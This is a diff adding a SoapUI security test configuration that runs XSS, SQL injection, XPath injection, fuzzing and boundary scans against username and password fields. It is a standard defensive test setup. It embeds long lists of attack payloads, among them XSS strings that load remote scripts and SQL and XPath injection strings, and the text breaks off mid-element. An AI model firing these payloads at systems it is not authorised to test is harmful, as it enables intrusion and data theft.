@@ -1,0 +1,1751 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<con:securityTest id="9702c836-69ba-4053-bb72-b5ef622d2b92" testCaseId="144505c6-b03d-43d1-8f24-71eb41db11e3" name="SecurityTest 2" failSecurityTestOnScanErrors="true" xmlns:con="http://eviware.com/soapui/config">
+  <con:settings>
+    <con:setting id="9702c836-69ba-4053-bb72-b5ef622d2b92fileName">SecurityTest-2</con:setting>
+  </con:settings>
+  <con:testStepSecurityTest>
+    <con:testStepId>d669030a-5e8c-4cf7-badd-9e8ae282be4b</con:testStepId>
+    <con:testStepSecurityScan type="BoundaryScan" name="Boundary Scan" id="7339ce6f-ee2e-45ea-ae44-ce9cf9cab2be" applyForFailedStep="false" disabled="false" runOnlyOnce="true">
+      <con:settings/>
+      <con:config xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
+      <con:assertion type="Sensitive Information Exposure" id="544ab41e-72c1-4a0d-8335-cc8dbf3b484e" name="Sensitive Information Exposure">
+        <con:configuration/>
+      </con:assertion>
+      <con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
+      <con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:parameters label="password" parameterName="password" xpath="" checked="true"/>
+        <con:parameters label="Request" parameterName="Request" xpath="" checked="true"/>
+        <con:parameters label="username" parameterName="username" xpath="" checked="true"/>
+      </con:checkedParameters>
+      <con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:strategy>ONE_BY_ONE</con:strategy>
+        <con:delay>100</con:delay>
+      </con:executionStrategy>
+    </con:testStepSecurityScan>
+    <con:testStepSecurityScan type="CrossSiteScriptingScan" name="Cross Site Scripting" id="bdf099ed-2f02-4590-8bb9-3ee2061b3344" applyForFailedStep="false" disabled="false" runOnlyOnce="true">
+      <con:settings/>
+      <con:config xsi:type="con:CrossSiteScriptingScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:parameterExposureStrings>&lt;PLAINTEXT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//-->&lt;/SCRIPT>">'>&lt;SCRIPT>alert(String.fromCharCode(88,83,83))&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>'';!--"&lt;XSS>=&amp;{()}</con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT SRC=http://soapui.org/xss.js>&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC="javascript:alert('XSS');"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC=javascript:alert('XSS')></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC=JaVaScRiPt:alert('XSS')></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC=`javascript:alert("RSnake says, 'XSS'")`></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG """>&lt;SCRIPT>alert("XSS")&lt;/SCRIPT>"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))></con:parameterExposureStrings>
+        <con:parameterExposureStrings><![CDATA[<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>]]></con:parameterExposureStrings>
+        <con:parameterExposureStrings><![CDATA[<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>]]></con:parameterExposureStrings>
+        <con:parameterExposureStrings><![CDATA[<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>]]></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC="jav	ascript:alert('XSS');"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC="jav&amp;#x09;ascript:alert('XSS');"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC="jav&amp;#x0A;ascript:alert('XSS');"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC="jav&amp;#x0D;ascript:alert('XSS');"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>perl -e 'print "&lt;IMG SRC=java\0script:alert(\"XSS\")>";' > out</con:parameterExposureStrings>
+        <con:parameterExposureStrings>perl -e 'print "&lt;SCR\0IPT>alert(\"XSS\")&lt;/SCR\0IPT>";' > out</con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC=" &amp;#14;  javascript:alert('XSS');"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT/XSS SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert("XSS")></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT/SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;&lt;SCRIPT>alert("XSS");//&lt;&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT SRC=http://soapui.org/xss.js?&lt;B></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT SRC=//ha.ckers.org/.j></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC="javascript:alert('XSS')"</con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;iframe src=http://soapui.org/scriptlet.html &lt;</con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT>a=/XSS/alert(a.source)&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>\";alert('XSS');//</con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;/TITLE>&lt;SCRIPT>alert("XSS");&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;BODY BACKGROUND="javascript:alert('XSS')"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;BODY ONLOAD=alert('XSS')></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG DYNSRC="javascript:alert('XSS')"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG LOWSRC="javascript:alert('XSS')"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;BGSOUND SRC="javascript:alert('XSS');"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;BR SIZE="&amp;{alert('XSS')}"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;LAYER SRC="http://soapui.org/scriptlet.html">&lt;/LAYER></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;LINK REL="stylesheet" HREF="javascript:alert('XSS');"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;LINK REL="stylesheet" HREF="http://soapui.org/xss.css"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;STYLE>@import'http://soapui.org/xss.css';&lt;/STYLE></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;META HTTP-EQUIV="Link" Content="&lt;http://soapui.org/xss.css>; REL=stylesheet"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;STYLE>BODY{-moz-binding:url("http://soapui.org/xssmoz.xml#xss")}&lt;/STYLE></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;XSS STYLE="behavior: url(xss.htc);"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;STYLE>li {list-style-image: url("javascript:alert('XSS')");}&lt;/STYLE>&lt;UL>&lt;LI>XSS</con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC='vbscript:msgbox("XSS")'></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC="mocha:[code]"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC="livescript:[code]"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>ï¿½scriptï¿½alert(ï¿½XSSï¿½)ï¿½/scriptï¿½</con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IFRAME SRC="javascript:alert('XSS');">&lt;/IFRAME></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;FRAMESET>&lt;FRAME SRC="javascript:alert('XSS');">&lt;/FRAMESET></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;TABLE BACKGROUND="javascript:alert('XSS')"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;TABLE>&lt;TD BACKGROUND="javascript:alert('XSS')"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;DIV STYLE="background-image: url(javascript:alert('XSS'))"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;DIV STYLE="background-image: url(&amp;#1;javascript:alert('XSS'))"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;DIV STYLE="width: expression(alert('XSS'));"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;STYLE>@im\port'\ja\vasc\ript:alert("XSS")';&lt;/STYLE></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;XSS STYLE="xss:expression(alert('XSS'))"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>exp/*&lt;A STYLE='no\xss:noxss("*//*");xss:&amp;#101;x&amp;#x2F;*XSS*//*/*/pression(alert("XSS"))'></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;STYLE TYPE="text/javascript">alert('XSS');&lt;/STYLE></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;STYLE>.XSS{background-image:url("javascript:alert('XSS')");}&lt;/STYLE>&lt;A CLASS=XSS>&lt;/A></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}&lt;/STYLE></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;!--[if gte IE 4]>&lt;SCRIPT>alert('XSS');&lt;/SCRIPT>&lt;![endif]--></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;BASE HREF="javascript:alert('XSS');//"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;OBJECT TYPE="text/x-scriptlet" DATA="http://soapui.org/scriptlet.html">&lt;/OBJECT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389>&lt;param name=url value=javascript:alert('XSS')>&lt;/OBJECT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;EMBED SRC="http://soapui.org/xss.swf" AllowScriptAccess="always">&lt;/EMBED></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always">&lt;/EMBED></con:parameterExposureStrings>
+        <con:parameterExposureStrings>a="get";b="URL(\"";c="javascript:";d="alert('XSS');\")";eval(a+b+c+d);</con:parameterExposureStrings>
+        <con:parameterExposureStrings><![CDATA[<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]]]>><![CDATA[<![CDATA[cript:alert('XSS');">]]]]>><![CDATA[</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>]]></con:parameterExposureStrings>
+        <con:parameterExposureStrings><![CDATA[<XML ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>]]></con:parameterExposureStrings>
+        <con:parameterExposureStrings><![CDATA[<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;"></BODY></HTML>]]></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT SRC="http://soapui.org/xss.jpg">&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;? echo('&lt;SCR)';echo('IPT>alert("XSS")&lt;/SCRIPT>'); ?></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC="http://soapui.org/somecommand.php?somevariables=maliciouscode"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>Redirect 302 /a.jpg http://soapui.org/admin.asp&amp;deleteuser</con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;META HTTP-EQUIV="Set-Cookie" Content="USERID=&amp;lt;SCRIPT&amp;gt;alert('XSS')&amp;lt;/SCRIPT&amp;gt;"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;HEAD>&lt;META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> &lt;/HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-</con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT a=">" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT =">" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT a=">" '' SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT "a='>'" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT a=`>` SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT a=">'>" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT>document.write("&lt;SCRI");&lt;/SCRIPT>PT SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
+      </con:config>
+      <con:assertion type="Sensitive Information Exposure" id="c2698e78-5d0c-43ad-b62b-dedd79b88a64" name="Sensitive Information Exposure">
+        <con:configuration/>
+      </con:assertion>
+      <con:assertion type="CrosSiteScript" id="7a41bce8-4fb7-465c-8559-b478ad42eca9" name="Cross Site Scripting Detection">
+        <con:configuration/>
+      </con:assertion>
+      <con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
+      <con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:parameters label="password" parameterName="password" xpath="" checked="true"/>
+        <con:parameters label="Request $.sample" parameterName="Request" xpath="$.sample" checked="true"/>
+        <con:parameters label="username" parameterName="username" xpath="" checked="true"/>
+      </con:checkedParameters>
+      <con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:strategy>ONE_BY_ONE</con:strategy>
+        <con:delay>100</con:delay>
+      </con:executionStrategy>
+    </con:testStepSecurityScan>
+    <con:testStepSecurityScan type="FuzzingScan" name="Fuzzing Scan" id="6561e358-a4e2-4dca-bed9-7012e19c50b5" applyForFailedStep="false" disabled="false" runOnlyOnce="true">
+      <con:settings/>
+      <con:config xsi:type="con:FuzzerScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:minimal>5</con:minimal>
+        <con:maximal>15</con:maximal>
+        <con:numberOfRequest>100</con:numberOfRequest>
+      </con:config>
+      <con:assertion type="Sensitive Information Exposure" id="ae4a193d-5ef9-4ea1-896a-595054a2578e" name="Sensitive Information Exposure">
+        <con:configuration/>
+      </con:assertion>
+      <con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
+      <con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:parameters label="password" parameterName="password" xpath="" checked="true"/>
+        <con:parameters label="Request" parameterName="Request" xpath="" checked="true"/>
+        <con:parameters label="username" parameterName="username" xpath="" checked="true"/>
+      </con:checkedParameters>
+      <con:executionStrategy xsi:nil="true" immutable="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:strategy>ALL_AT_ONCE</con:strategy>
+        <con:delay>100</con:delay>
+      </con:executionStrategy>
+    </con:testStepSecurityScan>
+    <con:testStepSecurityScan type="InvalidTypesSecurityScan" name="Invalid Types" id="049954e3-2c84-4add-8771-1225f87449c6" applyForFailedStep="false" disabled="false" runOnlyOnce="true">
+      <con:settings/>
+      <con:config xsi:type="con:InvalidSecurityScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:typesList>
+          <con:type>3</con:type>
+          <con:value>true</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>4</con:type>
+          <con:value>GpM7</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>5</con:type>
+          <con:value>0FB7</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>9</con:type>
+          <con:value>-1E4f</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>10</con:type>
+          <con:value>12.45E+12</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>11</con:type>
+          <con:value>-1.23</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>12</con:type>
+          <con:value>SoapUI is	 the
+ best</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>13</con:type>
+          <con:value>P1Y2M3DT10H30M12.3S</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>14</con:type>
+          <con:value>1999-05-31T13:20:00.000-05:00</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>16</con:type>
+          <con:value>1999-05-31</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>22</con:type>
+          <con:value>-1267896799</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>23</con:type>
+          <con:value>-882223334991111111</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>24</con:type>
+          <con:value>-2147483647</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>25</con:type>
+          <con:value>-32768</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>26</con:type>
+          <con:value>127</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>27</con:type>
+          <con:value>0</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>28</con:type>
+          <con:value>-1</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>29</con:type>
+          <con:value>1</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>30</con:type>
+          <con:value>1267896799</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>31</con:type>
+          <con:value>882223334991111111</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>32</con:type>
+          <con:value>294967295</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>33</con:type>
+          <con:value>65535</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>34</con:type>
+          <con:value>255</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>35</con:type>
+          <con:value>SoapUI is the best</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>36</con:type>
+          <con:value>SoapUI is the best</con:value>
+        </con:typesList>
+      </con:config>
+      <con:assertion type="Sensitive Information Exposure" id="9de3c4f1-e967-4bd5-ab84-b3c4d0645165" name="Sensitive Information Exposure">
+        <con:configuration/>
+      </con:assertion>
+      <con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
+      <con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:parameters label="password" parameterName="password" xpath="" checked="true"/>
+        <con:parameters label="Request" parameterName="Request" xpath="" checked="true"/>
+        <con:parameters label="username" parameterName="username" xpath="" checked="true"/>
+      </con:checkedParameters>
+      <con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:strategy>ONE_BY_ONE</con:strategy>
+        <con:delay>100</con:delay>
+      </con:executionStrategy>
+    </con:testStepSecurityScan>
+    <con:testStepSecurityScan type="SQLInjectionScan" name="SQL Injection" id="4e08bdee-24a0-442a-806d-1e6a6419b097" applyForFailedStep="false" disabled="false" runOnlyOnce="true">
+      <con:settings/>
+      <con:config xsi:type="con:SQLInjectionScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:sqlInjectionStrings>' or '1'='1</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>'--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>1'</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>admin'--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>/*!10000%201/0%20*/</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>/*!10000 1/0 */</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>1/0</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>'%20o/**/r%201/0%20--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>' o/**/r 1/0 --</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>;</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>'%20and%201=2%20--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>' and 1=2 --</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>test�%20UNION%20select%201,%20@@version,%201,%201;�</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>test� UNION select 1, @@version, 1, 1;�</con:sqlInjectionStrings>
+      </con:config>
+      <con:assertion type="Sensitive Information Exposure" id="20a4d491-b33d-4fa0-8fb6-33e1497e3148" name="Sensitive Information Exposure">
+        <con:configuration/>
+      </con:assertion>
+      <con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
+      <con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:parameters label="password" parameterName="password" xpath="" checked="true"/>
+        <con:parameters label="Request $.sample" parameterName="Request" xpath="$.sample" checked="true"/>
+        <con:parameters label="username" parameterName="username" xpath="" checked="true"/>
+      </con:checkedParameters>
+      <con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:strategy>ONE_BY_ONE</con:strategy>
+        <con:delay>100</con:delay>
+      </con:executionStrategy>
+    </con:testStepSecurityScan>
+    <con:testStepSecurityScan type="XPathInjectionSecurityScan" name="XPath Injection" id="09d0aa88-4651-409f-b205-0e12b85ddc25" applyForFailedStep="false" disabled="false" runOnlyOnce="true">
+      <con:settings/>
+      <con:config xsi:type="con:XPathInjection" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:xpathList>or name(//users/LoginID[1]) = 'LoginID' or 'a'='b</con:xpathList>
+        <con:xpathList>' or '1'='1</con:xpathList>
+        <con:xpathList>1/0</con:xpathList>
+        <con:xpathList>'%20o/**/r%201/0%20--</con:xpathList>
+        <con:xpathList>' o/**/r 1/0 --</con:xpathList>
+        <con:xpathList>;</con:xpathList>
+        <con:xpathList>'%20and%201=2%20--</con:xpathList>
+        <con:xpathList>' and 1=2 --</con:xpathList>
+        <con:xpathList>test�%20UNION%20select%201,%20@@version,%201,%201;�</con:xpathList>
+        <con:xpathList>test� UNION select 1, @@version, 1, 1;�</con:xpathList>
+      </con:config>
+      <con:assertion type="Sensitive Information Exposure" id="43d3d3c2-2bfd-4ce1-a5d5-c958e00a20ad" name="Sensitive Information Exposure">
+        <con:configuration/>
+      </con:assertion>
+      <con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
+      <con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:parameters label="password" parameterName="password" xpath="" checked="true"/>
+        <con:parameters label="Request $.sample" parameterName="Request" xpath="$.sample" checked="true"/>
+        <con:parameters label="username" parameterName="username" xpath="" checked="true"/>
+      </con:checkedParameters>
+      <con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:strategy>ONE_BY_ONE</con:strategy>
+        <con:delay>100</con:delay>
+      </con:executionStrategy>
+    </con:testStepSecurityScan>
+    <con:testStepSecurityProScan type="HttpMethodFuzzingScan" name="HTTP Method Fuzzing" id="1ea6bea7-281e-48ac-9f5c-da279591b217" applyForFailedStep="false" disabled="false" runOnlyOnce="true">
+      <con:settings/>
+      <con:config xsi:type="con:HttpMethodFuzzingScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:deselectedMethods/>
+      </con:config>
+      <con:assertion type="Sensitive Information Exposure" id="91a636bb-fc70-4295-88ce-2ec302843655" name="Sensitive Information Exposure">
+        <con:configuration/>
+      </con:assertion>
+      <con:assertion type="Valid HTTP Status Codes" id="70d7f89c-6e0a-49e7-99b7-26d507885b92" name="Valid HTTP Status Codes">
+        <con:settings>
+          <con:setting id="__LEVEL_">WARNING</con:setting>
+        </con:settings>
+        <con:configuration>
+          <codes>501,405,403</codes>
+        </con:configuration>
+      </con:assertion>
+      <con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
+      <con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
+      <con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:strategy>ONE_BY_ONE</con:strategy>
+        <con:delay>100</con:delay>
+      </con:executionStrategy>
+    </con:testStepSecurityProScan>
+    <con:testStepSecurityProScan type="InvalidJsonTypesSecurityScan" name="Invalid JSON Types" id="f4292be9-0054-4484-839f-146964a5da60" applyForFailedStep="false" disabled="false" runOnlyOnce="true">
+      <con:settings/>
+      <con:config xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
+      <con:assertion type="Sensitive Information Exposure" id="06fcaab6-c9dd-4fd5-88d6-e3ac0c483b01" name="Sensitive Information Exposure">
+        <con:configuration/>
+      </con:assertion>
+      <con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
+      <con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
+      <con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:strategy>ONE_BY_ONE</con:strategy>
+        <con:delay>100</con:delay>
+      </con:executionStrategy>
+    </con:testStepSecurityProScan>
+    <con:testStepSecurityProScan type="JsonBoundaryScan" name="JSON Boundary Scan" id="fb316b61-4d77-4df5-b0df-7b76041525b9" applyForFailedStep="false" disabled="false" runOnlyOnce="true">
+      <con:settings/>
+      <con:config xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
+      <con:assertion type="Sensitive Information Exposure" id="73291495-0d4f-4576-86f9-8c43434392b1" name="Sensitive Information Exposure">
+        <con:configuration/>
+      </con:assertion>
+      <con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
+      <con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
+      <con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
